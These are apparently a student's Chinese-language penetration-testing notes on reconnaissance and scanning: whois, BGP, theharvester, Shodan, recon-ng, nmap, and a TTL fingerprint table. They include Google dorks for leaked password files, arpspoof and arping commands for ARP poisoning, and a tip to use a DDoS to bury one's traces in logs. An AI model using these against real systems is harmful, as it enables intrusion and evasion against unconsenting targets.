+	Name Server: f1g1ns2.dnspod.net
+	Registration Time: 2017-02-21 14:18:08
+	Expiration Time: 2018-02-21 14:18:08
+	DNSSEC: unsigned
+	
+	有些域名，比如说.cf是默认自带隐私保护而不能被whois探查。
+	root@kali:~# whois scu.edu.cn
+	超时。
+	root@kali:~# whois edu.cn
+	the Domain Name you apply can not be registered online. Please consult your Domain Name registrar
+
+
+BGP查询： 
+	telnet route-views.oregon-ix.net 并输入用户名rviews  连接公用路由器
+	show ip bgp xx.x.x.x  然后找到合适的ip范围，每一块记录的最后面一串数字的最后一个就是ASN
+	show ip bgp regexp _ASN$  _代表空格，$表示结尾，这两个字符串的目的是过滤输出。 
+	
+	......
+	User Access Verification
+	Username: rviews
+	route-views>show ip bgp 121.48.206.170
+	BGP routing table entry for 121.48.192.0/19, version 9390096
+	Paths: (2 available, best #2, table default)
+	  Not advertised to any peer
+	  Refresh Epoch 1
+	  24441 131178 10099 4837 4538 4538                所以ASN号码就是AS4538
+		202.93.8.242 from 202.93.8.242 (202.93.8.242)
+		  Origin IGP, localpref 100, valid, external
+		  rx pathid: 0, tx pathid: 0
+	  Refresh Epoch 1
+	  2497 4134 4538 4538
+		202.232.0.2 from 202.232.0.2 (202.232.0.2)
+		  Origin IGP, localpref 100, valid, external, best
+      rx pathid: 0, tx pathid: 0x0
+	  
+	route-views>show ip bgp regexp _4538$  这条命令我执行失败了
+BGP table version is 20244611, local router ID is 128.223.51.103
+Status codes: s suppressed, d damped, h history, * valid, > best, i - internal,
+              r RIB-failure, S Stale, m multipath, b backup-path, f RT-Filter,
+              x best-external, a additional-path, c RIB-compressed,
+Origin codes: i - IGP, e - EGP, ? - incomplete
+RPKI validation codes: V valid, I invalid, N Not found
+     Network          Next Hop            Metric LocPrf Weight Path
+ *   1.51.0.0/16      195.208.112.161                        0 3277 3267 2603 20965 23911 4538 i
+ *                    64.71.137.241                          0 6939 4538 4538 4538 4538 4538 4538 i
+ *                    93.104.209.174                         0 58901 51167 1299 10026 4538 4538 4538 4538 i
+ *                    66.110.0.86                            0 6453 4538 4538 4538 4538 i
+ *                    212.66.96.126                          0 20912 6939 4538 4538 4538 4538 4538 4538 i *                    173.205.57.234                         0 53364 3257 10026 4538 4538 4538 4538 i
+ *                    194.85.40.15                           0 3267 2603 20965 23911 4538 i
+ *                    207.172.6.20            86             0 6079 10026 4538 4538 4538 4538 i
+ *                    207.172.6.1              0             0 6079 10026 4538 4538 4538 4538 i
+ *                    103.197.104.1                          0 134708 38623 4809 4134 4538 4538 i
+ *                    103.247.3.45                           0 58511 6939 4538 4538 4538 4538 4538 4538 i *                    202.93.8.242                           0 24441 131178 10099 4837 4538 4538 i
+ *                    193.0.0.56                             0 3333 1103 20965 23911 4538 i
+ *                    4.69.184.193             0             0 3356 174 4538 4538 4538 4538 i
+ *                    132.198.255.253                        0 1351 10578 11537 23911 4538 i
+ *                    208.74.64.40                           0 19214 174 4538 4538 4538 4538 i
+ *                    66.59.190.221                          0 6539 577 6939 4538 4538 4538 4538 4538 4538 i
+ *                    154.11.98.225            0             0 852 6939 4538 4538 4538 4538 4538 4538 i
+ *                    208.51.134.254        2514             0 3549 3356 4637 4538 4538 4538 4538 i
+ *                    114.31.199.1                           0 4826 4635 4637 4637 4637 4637 4637 4637 4538 4538 4538 4538 i
+ *                    12.0.1.63                              0 7018 6453 4538 4538 4538 4538 i
+ *                    94.142.247.3             0             0 8283 6453 4538 4538 4538 4538 i
+ 
+
+ 
+搜索引擎自动利用工具：
+	theharvester 通过指定搜索引擎和搜索数量上寻找指定域名的email和子域名
+	-d: Domain to search or company name
+	-b 指定搜索方式，如pgp、bing、google、twitter、...、all（这个参数必须指定）（google -l 1000 居然还屁都没有，直接上all了）
+	-l 限制搜索数量（1.方便阅读 2.免得自己被屏蔽），默认50，即使指定了超过50那也不会一次性全发
+	-h: use SHODAN database to query discovered hosts
+	-f: Save the results into an HTML and XML file (both)
+	theharvester -d microsoft.com -l 500 -b google -h myresults.html
+	proxychains theharvester -d baidu.com -l 200 -b bing -h result.html 使用bing搜索去得到子域名(result.html前省略了参数-f)
+	遇到几次说|DNS-response|: www.bing.com does not exist，反复试几次就好了。-l如果太小那么找到的信息也少。经过测试要使用代理，否则bing什么都不会返回。
+	搜索引擎都会有自己的保护机制，使用tor解决。不过最好自己写一个py守护进程每过几分钟改变/etc/proxychains
+
+dmitry：
+	-s domain_name 搜索子域名
+	-e	 Perform a search for possible email addresses
+	-i -w URL whois查询
+	-i	 Perform a whois lookup on the IP address of a host
+	-w	 Perform a whois lookup on the domain name of a host
+
+GHDB：敏感URL(软硬件后台yu特殊文件)，文件类型
+	由于cisco交换机里面用户分级别，使用google查询cisco交换机：
+	inurl:"level/15/exec/-/show"
+	即便有Cisco Router and Security Device Manager (SDM)也并没有什么用，借助google可以直接找到目录遍历漏洞。
+	搜索机架式网络摄像头：
+	intitle:"netbotz application"  intext:"ok"
+	有些设备挑浏览器的，win下IE什么的，不行就换一个，一般IE可以看到。
+	寻找后台登录：
+	inurl:/admin/login.php
+	qq账号与密码：
+	inurl:qq.txt
+	filetype:xls "username" | "password" | "passwd"  #连xls中的表名都可以获取到，这真的很让人惊讶
+	搜索FrontPage这个软件的漏洞，直接得到账号密码于网络访问service.pwd
+	inurl:service.pwd
+	Frontpage，是微软公司出品的一款网页制作入门级软件，2006年底已经停止提供。
+	Google Hacking Database（GHDB）:www.exploit-db.com/google-dorks
+	google不行就www.yandex.com
+	
+	
+特殊搜索引擎的使用：（这种引擎就是十分可怕的肉鸡搜索器）
+	SHODAN这个搜索引擎只爬互联网上的设备   www.shodan.io
+		提供API，用户账户里有一个API key。不登录账号的话会查不了。
+		常见filter：
+		net:IP在后面可以跟/24这种
+		city:xxxx
+		country: (CN、KR、US)
+		port: (80、21、22、23)
+		hostname: (主机或域名)
+		server:apache/2.2.3
+		os:xxxx
+		hostname:scu.edu.cn比直接scu.edu.cn好多了,后者估计是在内容中搜索
+		shadon爬的时候都已经使用了默认的一些账号与密码进行登录，所以有些才会是401.
+		使用举例：
+			country:CN city:beijing HTTP/1.1 200
+			200 OK cisco country:JP
+			user:admin pass:password
+			linux upnp avtech
+		shodan有浏览器扩展
+	https://www.zoomeye.org/国内对互联网设备和网站节点的搜索
+	app:"IBM WebSphere Application Server" ver:"6.1"
+	它域名边上有个小图标用于新窗口打开，挺好的。
+
+	
+	
+网络结构查询： nmap -A的时候会执行
+	tranceroute（windows下为了和旧命名统一，叫tracert）
+
+元数据EXIF：
+	exif、metagoofil、foca（windows）、SearchDiggity（windows）、自带的图片查看器可以显示照片的详细信息（windows）（还会自己调用地图来显示位置）
+	exif命令除了-l查看所欲EXIF信息，还可以对EXIF信息进行增删，还可以压入或者提取出、删除缩略图。
+	包含信息文件：Microsoft Office文件，Open Office或PDF文件，甚至还可以分析Adobe InDesign或者SVG文件，图片文件
+	PS：foca也提供了DNS查询方面的功能，但是我在win10下使用，软件界面显示有问题。
+	metagoofil -d xxxxx.com -t pdf.doc.xls,pptx -n 20 -o files -f result.html和theharvester同一家出品，参数类似，-o表示下载到的文件放在files目录下。支持的类型目前就只有这四种：word、ppt、excel、pdf。
+	
+
+	
+dnsrecon：
+	dnsrecon 是一个更加自动化的dns查找工具：
+	-t 模式/类型 axfr，std（SOA, NS, A, AAAA, MX and SRV），goo（Google search），brt
+	-d 指定目标    这个参数要放在前面
+	-n, --name_server 指定查询dns
+	--lifetime 10 不是10s，不知道到底是该讲多少时间，反正就隔一段时间来一批dns查询
+	dnsrecon -t axfr -d sina.com
+	会先找到并返回最后一层NDS服务器，比如ns1.sina.com。然后对所有都试一遍axfr。
+	dnsrecon -t std -d www.sina.com #他有很多模式，其中std会尝试SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
+	root@kali:~# dnsrecon -t std -d www.sina.com（std查的很全很全，比nslookup和dig都强）
+	[*] Performing General Enumeration of Domain:
+	[-] DNSSEC is not configured for www.sina.com
+	[-] Could not Resolve SOA Record for www.sina.com
+	[-] Could not Resolve NS Records for www.sina.com
+	[-] Could not Resolve MX Records for www.sina.com
+	[*] 	 CNAME www.sina.com us.sina.com.cn
+	[*] 	 CNAME us.sina.com.cn news.sina.com.cn
+	[*] 	 CNAME news.sina.com.cn jupiter.sina.com.cn
+	[*] 	 CNAME jupiter.sina.com.cn cernetnews.sina.com.cn
+	[*] 	 A cernetnews.sina.com.cn 121.194.0.239
+	[*] Enumerating SRV Records
+	[-] No SRV Records Found for www.sina.com
+	[*] 0 Records Found
+	proxychains dnsrecon -t goo -d sina.com #Perform Google search for subdomains and hosts.
+	第一次出现socket error，要几次才会成功一次，不知道是不是谷歌防爬虫，可是--lifetime又对这个没有作用
+	最后找到36个子域名。想到还有站长之家什么的。
+	-t brt是最后一个有用的模式，需要配合-D 来指定字典(一般.txt格式)使用以及--lifetime
+	dpkg -L dnsrecon | grep txt #kali中的字典后缀也是txt 
+
+	dnsmap是个专门dns爆破的，速度和dnsrecon差不多感觉，都是包括一个显示一个。不过由于专门爆破，所以默认字典比dnsrecon全很多。
+	我用了du命令来查看文件大小。dnsrecon是9个多线程爆破，C-C以后不能马上结束还要等待线程完结。
+	可以使用ps -Lf pid来查看指定进程开了几个线程，几个线程就会出现几行。。。dnsmap居然是单线程的，看来还是dnsrecon快，dnsmap也就默认字典好一点。/usr/share/dnsmap/wordlist_TLAs.txt 
+
+host：A DNS lookup utility
+	host -a baidu.com 8.8.8.8（相当于dig baidu.com any）
+	root@kali:~/websites/test/www.hellovega.cn# host www.hellovega.cn
+	www.hellovega.cn is an alias for www.hellovega.cn.cdn.dnsv1.com.
+	www.hellovega.cn.cdn.dnsv1.com is an alias for 212.tc.sp.cdntip.com.
+	212.tc.sp.cdntip.com has address 58.216.107.101
+	root@kali:~/websites/test/www.hellovega.cn# host www.hellovega.cn/jwc
+	Host www.hellovega.cn/jwc not found: 3(NXDOMAIN)
+	root@kali:~/websites/test/www.hellovega.cn# host hellovega.cn
+	hellovega.cn mail is handled by 10 mxbiz2.qq.com.
+	hellovega.cn mail is handled by 5 mxbiz1.qq.com.
+	
+
+https://www.vthreat.com 这个网页集成了被动信息搜索工具，每一个账号每一天2，3次
+说明：https://www.vthreat.com/documentation/	
+	
+
+图形界面重量级信息搜索软件maltego
+	打开以后需要登录之后设置信息传输来自哪里，一般就是选择Maltego的公用服务器。
+	kali上面的没想到默认情况下什么都没有，需要在home标签页上安装插件。
+	通过C-T新建项目以后，在左边面板选择需要使用的功能。
+
+
+搜索框架recon-ng：框架交互模式下帮助是help
+	带数据库，但是没有端口监听，所以看来是直接集成了数据库格式的读取和写入。
+
+	workspaces list
+	workspaces add/delete/select name后面这四个tab两下出来，后面加上名字（可以指定路径）（wordspace默认在~/.recon-ng/workspaces，里面是个数据库文件）（不过keys.db文件是存在外面的，估计这个是全局的）
+
+	keys XXXXXX（类似上面） 指API keys
+keys add twitter_api 123
+keys delete twitter_api
+	keys list
+	show options 现在show的是全局的设置
+	set optionName xxx     nameserver，代理和User-Agnet在这里设置
+	show modules reporting/ 记得用Tab，/可以没有，估计是目录吧
+
+	back 回到上一级（退出自然也就是这个命令了）
+	help 就是比当前层级下两次Tab详细些的输出
+	help xxx 具体查看
+
+	clear
+
+	add domains scu.edu.cn
+	show domains
+	加载
+
+	show modules
+	需要爆破的时候：
+	search brute
+	然后use 爆破模块
+	show info可以查看当前module具体
+	show options
+	show source 查看代码
+[recon-ng][default] > show   show空格以后再Tab两下
+banner           domains          modules          pushpins
+companies        hosts            netblocks        repositories
+contacts         keys             options          schema
+credentials      leaks            ports            vulnerabilities
+dashboard        locations        profiles         workspaces
+有使用的模块也有结果的模块
+
+[recon-ng][default] > use test
+[recon-ng][default][mailtester] > show info     这个模块的作用是对数据库中收集到的email进行有效性筛选
+      Name: MailTester Email Validator
+      Path: modules/recon/contacts-contacts/mailtester.py
+    Author: Tim Tomes (@LaNMaSteR53)
+Description:
+  Leverages MailTester.com to validate email addresses.
+Options:
+  Name    Current Value  Required  Description
+  ------  -------------  --------  -----------
+  REMOVE  False          yes       remove invalid email addresses
+  SOURCE  default        yes       source of input (see 'show info' for details)
+
+Source Options:
+  default        SELECT DISTINCT email FROM contacts WHERE email IS NOT NULL
+  <string>       string representing a single input
+  <path>         path to a file containing a list of inputs
+  query <sql>    database query returning one column of inputs
+
+
+	[recon-ng][default] > use bing
+	[*] Multiple modules match 'bing'.
+	  Recon
+	  -----
+		recon/companies-contacts/bing_linkedin_cache
+		recon/domains-hosts/bing_domain_api
+		recon/domains-hosts/bing_domain_web #这个用来bing搜索寻找子域名，来填充hosts
+		recon/hosts-hosts/bing_ip
+
+
+	进入模块后
+	show options  这时候设置的是模块参数
+	如果没有设置就
+	set SOURCE sina.com这样
+	show options 里还会出现自带的字典
+
+	解析IP地址为主机：
+	search resolve #在resolv的时候，如果找到新的host就会加入hosts列表
+
+	[recon-ng][video][resolve] > use free
+	[recon-ng][video][freegeoip] > 
+	使用http://freegeoip.net/?q=121.48.194.138来定位到城市
+
+	show hosts
+	add hosts
+	hosts生成差不多了后生成报告：
+	search report
+
+
+
+	联系人
+	search contact
+
+	Usage: set <option> <value>
+
+	  Name    Current Value  Required  Description
+	  ------  -------------  --------  -----------
+	  SOURCE  default        yes       source of input (see 'show info' for details)
+
+	[recon-ng][default][resolve] > set default 202.102.110.207
+	[!] Invalid option.
+	[recon-ng][default][resolve] > set "Current Value" 202.102.110.207
+	[!] Invalid option.
+	[recon-ng][default][resolve] > set SOURCE 202.102.110.207
+	SOURCE => 202.102.110.207
+	[recon-ng][default][resolve] > show options
+
+	  Name    Current Value    Required  Description
+	  ------  -------------    --------  -----------
+	  SOURCE  202.102.110.207  yes       source of input (see 'show info' for details)
+
+
+	run
+
+	show hosts可以看到自己recon的结果
+
+	show info 模块下的帮助
+
+	[recon-ng][test][ipinfodb] > delete hosts
+	rowid(s) (INT): 1
+	[recon-ng][test][ipinfodb] > add hosts
+	host (TEXT): zhjw.scu.edu.cn
+	ip_address (TEXT): 
+	region (TEXT): 
+	country (TEXT): 
+	latitude (TEXT): 
+	longitude (TEXT): 
+	[recon-ng][test][ipinfodb] > show hosts
+
+	+-----------------------------------------------------------------------------------------------+
+	| rowid |       host      | ip_address | region | country | latitude | longitude |    module    |
+	+-----------------------------------------------------------------------------------------------+
+	| 1     | zhjw.scu.edu.cn |            |        |         |          |           | user_defined |
+	+-----------------------------------------------------------------------------------------------+
+
+	[recon-ng][test][ipinfodb] > use resolve
+	[*] Multiple modules match 'resolve'.
+	  Recon
+	  -----
+		recon/hosts-hosts/resolve #选中这个，把ip run出来
+		recon/hosts-hosts/reverse_resolve
+		recon/netblocks-hosts/reverse_resolve
+
+
+
+	[recon-ng][test][ipinfodb] > use ip
+	[*] Multiple modules match 'ip'.
+	  Recon
+	  -----
+		recon/hosts-hosts/bing_ip
+		recon/hosts-hosts/freegeoip #
+		recon/hosts-hosts/ipinfodb #这两个根据ip来继续填补hosts内容的
+		recon/hosts-ports/shodan_ip
+	其实freegeoip也是有查ip的功能，这样可以改代码之后也就没有必要用resolv模块了，每次改完代码要重新启动recon-ng才会生效。
+	http://freegeoip.net/json/swjx.scu.edu.cn不过我看了两边的代码，for host in hosts 中host不一样，一个是真的是hosts中的host，一个是hosts中的ip_address。不过我想通了不能把查ip的功能给freegeoip，因为resolve是使用DNS查询，这个比那个网站查询更可能精准，之后再使用freegeoip以ip去查位置。
+
+	再用freegeoip查到的经纬度确定locations
+	[recon-ng][video] > use reverse_geo
+	[recon-ng][video][reverse_geocode] > add locations
+	latitude (TEXT): 30.6667
+	longitude (TEXT): 104.0667
+	street_address (TEXT): 
+	这个使用了google Map所以要走proxychains。定位由于经纬度不准，外加地图勉勉强强，所以偏差还是不小的。具体位置还要综合起来查一下。
+	show locations
+
+	使用flickr借助经纬度搜索相关photo
+	Media_Url是完全图
+	Thumb_Url是缩略图
+	|DNS-response|: api.flickr.com does not exist
+	[!] URLError: <urlopen error [Errno 1] Unknown error>.
+	再来一次就查到一些照片了
+
+	[recon-ng][video][flickr] > use reporting/pushpin
+	[recon-ng][video][pushpin] > set LATITUDE 30.675501
+	LATITUDE => 30.675501
+	[recon-ng][video][pushpin] > set LONGITUDE 104.070670
+	LONGITUDE => 104.070670
+	[recon-ng][video][pushpin] > set RADIUS 1
+	RADIUS => 1
+	[recon-ng][video][pushpin] > run
+	会生成并打开两个网页，分别显示照片的缩略图和地理位置
+
+	[recon-ng][video][pushpin] > use reporting/html
+	[recon-ng][video][html] > set CREATOR Li Peinan
+	CREATOR => Li Peinan
+	[recon-ng][video][html] > set CUSTOMER scu.edu.cn   #我还以为叫TARGET
+	CUSTOMER => scu.edu.cn
+	[recon-ng][video][html] > set FILENAME /root/Desktop/scu.edu.html
+	FILENAME => /root/Desktop/scu.edu.html
+	这个模块会输出顶层的选项比如说hosts，domains，locations这些
+
+	支持数据库查询语句（query+SQL指令）：query select * from hosts
+	可以使用Database Accessment-》SQLite Dtabases Browser 来查看recon-ng的db文件
+
+	可以把一切运行命令保存在一个文件中，一行一命令，然后“resource 绝对路径”来运行。或者再启动recon-ng的时候使用参数“-r 绝对路径”
+	可以辅以spool start 和spool stop来记录期间的一切交互，来差错。spool文件输出的位置在/usr/share/recon-ng/
+	有个类似的是snapshots（第一层下help snapshots）（使用的话到处都可以snapshots），
+
+	如果要走代理的话，那么就一开始proxychains recon-ng
+	root@kali:/usr/share/recon-ng# ls
+		data  modules  recon  recon-cli  recon-ng  recon-rpc  VERSION
+	recon类模块的BaseModule在/usr/share/recon-ng/recon/core# cat module.py 中定义
+	模块代码在/usr/share/recon-ng/modules/	
+	
+	shell ls /  （shell开头可以支持执行部分终端命令）
+
+
+同一个局域网内被动获取信息：
+	netdiscover 抓arp包
+	p0f 抓应用层包  -i eth0  -o  output.log
+
+	
+	
+windows	下的扫描器推荐使用namp、superscan以及带有弱口令扫描的x-scan。
+	
+主动信息搜集：
+	robots.txt、目录遍历漏洞
+	OPTIONS包探测
+	使用肉鸡或者代理或者发出大量包把自己主机也藏在里面。如果对方安全意识不高，就可以来波DDOS来刷日志隐藏自己。
+	
+	二层：arpsproof arping nmap netdiscover（主被动，指定了-p passive以后才是被动）
+	三层：nmap -sn --send-ip（涉及ICMP验证是否存在，DNS反向查询，但是跳过本地arp查询）
+			-sn: Ping Scan - disable port scan
+			--send-eth/--send-ip: Send using raw ethernet frames or IP packets
+			会返回对方的mac和开机状态
+	ping IP -c Number
+	traceroute（指定"udp"（udp53）、"tcp"(tcp80)等端口可以绕过防火墙）
+	hping3
+	四层：端口扫描
+	nmap -Px host discover   可以设置各种标志位或者全连接，x表示某个字母,-Px HOST DISCOVERY, -Sx SCAN TECHNIQUES
+		   -Sx scan         
+	hping3
+	五层扫描：进行目标主机服务（包括防火墙）与操作系统探查，通过banner信息或者说fingerprint
+	nmap，amap，nc、ncat，xprobe2，通过TTL值来判断操作系统，通过开放了特殊的端口来判断操作系统
+	SNMP扫描：onesixtyone，snmpwalk，snmp-check
+	SMB扫描：nmap，nbtscan，enum4linux
+	SMTP扫描：nmap 
+	负载均衡检测Load balancing detect：lbd
+	waf检测：wafw00f
+	弱点扫描：nmap，openvas，Nessus
+	web信息搜集：Nikto，Vega，skipfish，w3af，Arachni，OWASP_ZAP，burpsuite
+	被动检测：p0f
+	内网端口转发：socat lcx
+
+https://cirt.net/passwords（或许搜索引擎更好用
+新闻网站等这类能带给我们不错的回报。
+TCP是开放了端口的话会返回响应
+UDP是如果没开放的话就会给出响应
+一般端口扫描程序自己这边开放的扫描端口并不是固定只有一个，也是在不断变化。算是种隐藏。
+有的公司服务器如果受到攻击，服务器响应头改变，攻击前返回的是waf产品的名字。
+以上扫描只要开了windows xp防火墙，全部被挡住！
+Netware是NOVELL公司推出的网络操作系统（就是结合了网络的功能，包括局域网的操作系统）。这个与网络操作系统对于nessus扫描是脆弱的，默认在配置中不予以扫描。网络打印机也属于脆弱设备。
+漏洞扫描注意CVE、OSVDB和BID（bugtrap）号码。
+端口敲门：公有云通常可以从互联网的任何地方都访问到，这使得他们容易受到各种各样的SSH攻击。这当然可以通过禁用SSH服务来防止，但是这样也无法使用SSH来管理服务器了。端口敲门是一项和防火墙一起使用的技术，在收到一个特殊的端口敲击顺序后再开启指定的端口。它使用数据头同服务器交换隐秘信息，打开一个指定的端口。隐秘敲门暗号被封装成一组有序的端口，并且需要发送SYN包来验证有效性。当对任意端口的SYN包的正确顺序被接收到时，客户端才会被允许访问该端口。这种方法很有局限性，因为这是一种隐晦式安全的实现，并且攻击者仍然可以暴力攻击SYN包需要发送的端口顺序。
+
+
+
+对防火墙是否存在的判断：
+	对防火墙的tcp一般规律： /左边是我发的，右边是我收到的
+	First			then		means
+	SYN/No    		ACK/RST		Filtered
+	SYN/SYN+ACK or SYN+RST  ACK/no		Filtered
+	SYN/SYN+ACK or SYN+RST	ACK/RST		Unfiltered or OPen 
+	SYN/No			ACK/No		Closed
+	如果两次发包中，有一次为No无响应就会说filtered，两次都是则Closed的概率大。
+TTL：
+	windows7以前的系统、win10，TTL值为128(65-128)
+	Linux/Unix/windows7以后 TTL: 64(1-64)
+	某些Unix：255
+OS 	Version 	Protocol 	TTL  	 
+AIX 	  	TCP 	60
+AIX 	  	UDP 	30
+AIX 	3.2, 4.1 	ICMP 	255
+  	  	  	 
+BSDI 	BSD/OS 3.1 and 4.0 	ICMP 	255
+  	  	  	 
+Compa 	Tru64 v5.0 	ICMP 	64
+  	  	  	 
+DEC Pathworks 	V5 	TCP and UDP 	30
+  	  	  	 
+FreeBSD 	2.1R 	TCP and UDP 	64
+FreeBSD 	3.4, 4.0 	ICMP 	255
+FreeBSD 	5 	ICMP 	64
+  	  	  	 
+HP-UX 	9.0x 	TCP and UDP 	30
+HP-UX 	10.01 	TCP and UDP 	64
+HP-UX 	10.2 	ICMP 	255
+HP-UX 	11 	ICMP 	255
+HP-UX 	11 	TCP 	64
+  	  	  	 
+Irix 	5.3 	TCP and UDP 	60
+Irix 	6.x 	TCP and UDP 	60
+Irix 	6.5.3, 6.5.8 	ICMP 	255
+  	  	  	 
+MPE/IX (HP) 	  	ICMP 	200
+  	  	  	 
+Linux 	2.0.x kernel 	ICMP 	64
+Linux 	2.2.14 kernel 	ICMP 	255
+Linux 	2.4 kernel 	ICMP 	255
+Linux 	Red Hat 9 	ICMP and TCP 	64
+  	  	  	 
+MacOS/MacTCP 	2.0.x 	TCP and UDP 	60
+MacOS/MacTCP 	X (10.5.6) 	ICMP/TCP/UDP 	64
+  	  	  	 
+NetBSD 	  	ICMP 	255
+  	  	  	 
+Netgear FVG318 	  	ICMP and UDP 	64
+  	  	  	 
+OpenBSD 	2.6 & 2.7 	ICMP 	255
+  	  	  	 
+OpenVMS 	7.1-2 	ICMP 	255
+  	  	  	 
+OS/2 	TCP/IP 3.0 	  	64
+  	  	  	 
+OSF/1 	V3.2A 	TCP 	60
+OSF/1 	V3.2A 	UDP 	30
+  	  	  	 
+Solaris 	2.5.1, 2.6, 2.7, 2.8 	ICMP 	255
+Solaris 	2.8 	TCP 	64
+  	  	  	 
+Stratus 	TCP_OS 	ICMP 	255
+Stratus 	TCP_OS (14.2-) 	TCP and UDP 	30
+Stratus 	TCP_OS (14.3+) 	TCP and UDP 	64
+Stratus 	STCP 	ICMP/TCP/UDP 	60
+  	  	  	 
+SunOS 	4.1.3/4.1.4 	TCP and UDP 	60
+SunOS 	5.7 	ICMP and TCP 	255
+  	  	  	 
+Ultrix 	V4.1/V4.2A 	TCP 	60
+Ultrix 	V4.1/V4.2A 	UDP 	30
+Ultrix 	V4.2 - 4.5 	ICMP 	255
+  	  	  	 
+VMS/Multinet 	  	TCP and UDP 	64
+VMS/TCPware 	  	TCP 	60
+VMS/TCPware 	  	UDP 	64
+VMS/Wollongong 	1.1.1.1 	TCP 	128
+VMS/Wollongong 	1.1.1.1 	UDP 	30
+VMS/UCX 	  	TCP and UDP 	128
+  	  	  	 
+Windows 	for Workgroups 	TCP and UDP 	32
+Windows 	95 	TCP and UDP 	32
+Windows 	98 	ICMP 	32
+Windows 	98, 98 SE 	ICMP 	128
+Windows 	98 	TCP 	128
+Windows 	NT 3.51 	TCP and UDP 	32
+Windows 	NT 4.0 	TCP and UDP 	128
+Windows 	NT 4.0 SP5- 	  	32
+Windows 	NT 4.0 SP6+ 	  	128
+Windows 	NT 4 WRKS SP 3, SP 6a 	ICMP 	128
+Windows 	NT 4 Server SP4 	ICMP 	128
+Windows 	ME 	ICMP 	128
+Windows 	2000 pro 	ICMP/TCP/UDP 	128
+Windows 	2000 family 	ICMP 	128
+Windows 	Server 2003 	  	128
+Windows 	XP 	ICMP/TCP/UDP 	128
+
+
+从电子邮件服务器提取信息，这种企业必须开通的，那就是一个攻击面。邮件检测系统会对收到的文件进行检测，比如说不能包含批处理文件、exe文件之类。然后你可能收到退信，而退信中的信息就显得重要了，什么防御软件或者安全意识怎么样，只是限制了后缀名么？等等
+
+通过实现中间人攻击： 详情可以看内网.txt
+	arpspoof -i eth0 -t 192.168.1.5  192.168.1.1
+
+可以自己构造发包的scapy：
+这是一款借助py实现的软件，内部语法与py类似，存在可以直接被py调用的库（scapy3K开始支持py3，from scapy.all import * ）（你需要pip3 install scapy-python3得到最新的发布版，如果是从gi上获取那么得到的是当前的发展版）
+	Ether 是最底层的包。Ether(src=interface, dst=target_mac) / ARP(hwsrc=mac, psrc=host, hwdst=target_mac, pdst=target)
+	>>> ARP().display()  #不display那就没有换行排版来输出
+	###[ ARP ]###
+	  hwtype= 0x1
+	  ptype= 0x800
+	  hwlen= 6
+	  plen= 4
+	  op= who-has
+	  hwsrc= 00:0c:29:97:3a:d3
+	  psrc= 192.168.1.181
+	  hwdst= 00:00:00:00:00:00  #注意这里是全0
+	  pdst= 0.0.0.0
+	<=>
+	arp=ARP()
+	arp.dispaly()
+
+	arp.pdst="xxxxx" 是字符串，也只能是字符串毕竟有特殊字符存在
+	sr1(arp)就会把包发出去，如果卡在那里，就会导致一直运行在哪里，我加了timeout=0.1或者靠C-C退出，C-C不会退出交互模式。
+	>>> sr1(r,timeout=1)	#sr1函数就是发出包并且只接受一个响应包（请求包与响应包之间默认不存在对应关系，所以只能是乱接。QT的异步发包倒是记录了对应关系），send的话就是发包
+	Begin emission:
+	Finished to send 1 packets.
+	*
+	Received 1 packets, got 1 answers, remaining 0 packets
+	<IP  version=4L ihl=5L tos=0x0 len=40 id=2542 flags=DF frag=0L ttl=64 proto=tcp chksum=0xacdb src=192.168.1.1 dst=192.168.1.181 options=[] |<TCP  sport=http dport=ftp_data seq=0 ack=0 dataofs=5L reserved=0L flags=R window=0 chksum=0x2b76 urgptr=0 |<Padding  load='\x00\x00\x00\x00\x00\x00' |>>>
+	>>> a=sr1(r,timeout=1)  #这个后面就会少一串(把输出给了a)，而且注释确实是#
+	Begin emission:
+	Finished to send 1 packets.
+	*
+	Received 1 packets, got 1 answers, remaining 0 packets
+	对a的使用就是a[TCP].flags==4
+	>>> send(arp) #如果使用send函数告知已发送以后就结束了
+	.
+	Sent 1 packets.
+	>>> i =IP()
+	>>> t =TCP()
+	>>> request=i/t 把ip个tcp组合在一起
+	request[IP].ip成员
+	request[TCP].tcp成员
+	tcp的flags设置成"A"就是ACK。
+	完整版的指令:a=sr1(IP(dst="192.168.1.1")/TCP(dport=80, flags="A"), timeout=1)
+	
+	exit()或者C-D退出，退出方式就是py交互式界面中的退出方式
+
+tor-resolve
+	tor工具包内工具，可以通过tor网络来进行DNS查询
+	《=》设置并使用proxychains
+netdiscover：
+	-p 不开启主动扫描，仅仅嗅探
+	-d ignore home config files for autoscan and fast mode
+	-r range
+	主动命令：
+	netdiscover -i eht0 -r 1.1.1.0/24 超快就扫完了，但是不会自己退出，还会继续监听。
+	netdiscover -l lplist.txt 使用ip地址列表文件
+	被动：
+	netdiscover -p 抓取arp响应包并且记录
+
+arping：
+	BUGS
+		You have to use -B instead of arpinging 255.255.255.255, and -b instead
+		of -S 255.255.255.255. This is libnets fault.
+	-0 设置源地址位0.0.0.0 当还没有IP的时候用这个去向分配者获取。gateway换了个新的，那么IP就相当于失效而没有了。
+	-b Like -0 but source broadcast source  address  (255.255.255.255)。发出去的包相当于who has xxxIP? tell 255.255.255.255
+	然后什么效果都没有，确定是理都没理。
+	-S 自己指定一个IP作为源IP发送给指定IP
+	-s 设定源MAC
+	-p 指定目标MAC
+	-c Only send count requests.
+	-d 查看某个IP是否被不同的MAC占用
+	要想遍历地址，只能配合脚本使用，本命令为一对一命令
+	arping -S 192.168.1.208 -t 12:12:12:12:12:12  192.168.1.1  -P
+	arping -S 192.168.1.1  192.168.1.208 通过reques发动arp poison
+	arping -S 192.168.1.1  -t 12:12:12:12:12:12 192.168.1.208   额外指定了目标mac
+	arping -S 192.168.1.2 -s e0:b4:29:d0:f5:e2 192.168.1.1 #是发出查询包，而不是响应包
+	发包给192.168.1.1也没有理睬？不，其实是因为你的网卡还没有被设置为misc模式，使用wireshark设置一下（也就是把抓包开着就好），这样就可以看到返回了，而且arping在终端中的显示也不会是timeout。不是timeout也就是有响应，但是arping的检测很简单，只要有arp response就会不是timeout而不检测是不是发送给你的response。
+	arp攻击是靠请求包：arping -S 192.168.1.4 -s e0:b4:29:d0:f5:e2  192.168.1.147 -c 1
+	而不是响应包arping -S 192.168.1.4 -s e0:b4:29:d0:f5:e2 -PU 192.168.1.147，响应包最后要有个ip..其实完全不需要，但是arping要想能运行有这个要求，还有-P参数就足以发出响应包了。
+	arping -S 192.168.1.1   192.168.1.147 这条命令才能改变192.168.1.147的arp缓存。不是自己就不会接受！所以树莓派连上路由以后，笔记本中arp -a要过段时间才能有树莓派的缓存。
+	-U 会广播响应包，但是并没有用
